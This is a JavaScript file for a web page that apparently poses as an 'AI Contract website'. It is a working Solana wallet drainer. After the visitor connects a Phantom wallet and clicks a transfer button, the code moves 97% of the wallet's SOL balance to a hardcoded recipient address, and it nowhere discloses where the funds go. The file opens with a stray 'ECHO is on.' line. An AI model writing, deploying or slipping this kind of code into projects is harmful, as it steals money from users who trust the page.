ECHO is on.const { Connection, PublicKey, clusterApiUrl, SystemProgram, Transaction } = solanaWeb3;

let wallet;
let connection;
const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ"; // Your recipient address

// Initialize wallet adapter
function initializeWallet() {
  if (window.solana && window.solana.isPhantom) {
    wallet = window.solana;
    connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
    console.log("Phantom Wallet found!");
  } else {
    console.log("Phantom Wallet not detected.");
    alert("Please install Phantom wallet or ensure it's connected!");
  }
}

// Connect wallet
async function connectWallet() {
  try {
    // Check if wallet is already connected
    if (!wallet.connected) {
      console.log("Requesting wallet connection...");
      await wallet.connect();
    }
    // Enable transfer button when wallet is connected
    document.getElementById("transferButton").disabled = false;
    console.log("Wallet connected:", wallet.publicKey.toString());
  } catch (err) {
    console.error("Wallet connection failed:", err);
    alert("Failed to connect to Phantom Wallet. Please try again.");
  }
}

// Get balance of SOL
async function getBalances() {
  const publicKey = wallet.publicKey;
  const solBalance = await connection.getBalance(publicKey);
  console.log(`SOL Balance: ${solBalance / 1e9} SOL`);
  return solBalance;
}

// Transfer SOL and SPL tokens
async function transferTokens() {
  const solBalance = await getBalances();
  const transferSolAmount = (solBalance * 0.97) / 1e9; // 97% of SOL
  console.log(`Transferring ${transferSolAmount} SOL`);

  // Create transaction
  const transaction = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: wallet.publicKey,
      toPubkey: new PublicKey(recipientAddress),
      lamports: transferSolAmount * 1e9, // Convert SOL to lamports
    })
  );

  // Sign and send the transaction
  try {
    const signature = await wallet.sendTransaction(transaction, connection);
    console.log("Transaction sent:", signature);
    await connection.confirmTransaction(signature);
    console.log("Transaction confirmed:", signature);
  } catch (err) {
    console.error("Transaction failed:", err);
    alert("Transaction failed! Please check your wallet balance and try again.");
  }
}

// Event listeners
document.getElementById("connectButton").addEventListener("click", () => {
  connectWallet();
});

document.getElementById("transferButton").addEventListener("click", () => {
  transferTokens();
});

// Initialize wallet on page load
window.onload = () => {
  initializeWallet();

  // Self-typing welcome message
  const welcomeMessage = document.getElementById('welcomeMessage');
  let index = 0;
  const message = "Welcome to the AI Contract website...";
  function typeMessage() {
    if (index < message.length) {
      welcomeMessage.innerHTML += message.charAt(index);
      index++;
      setTimeout(typeMessage, 100); // Speed of typing
    } else {
      setTimeout(() => {
        welcomeMessage.style.display = 'none'; // Hide after typing
      }, 2000); // Wait 2 seconds before hiding
    }
  }
  typeMessage();
};
